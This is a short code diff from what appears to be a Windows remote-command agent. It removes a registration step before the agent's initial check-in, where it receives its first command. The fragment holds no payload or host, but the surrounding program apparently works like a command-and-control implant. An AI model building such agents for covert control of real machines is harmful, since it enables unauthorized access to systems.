@@ -121,13 +121,6 @@ int main(void) {
             attempt, sleep_ms);
         Sleep((DWORD)sleep_ms);
     }
-    
-
-    if (do_register(agent_id, AGENT_ID_SIZE) != 0) {
-        fprintf(stderr, "[!] Registration failed\n");
-        shell_cleanup();
-        return 1;
-    }
 
     /*
      * Initial checkin — sends startup output (empty), receives first command.
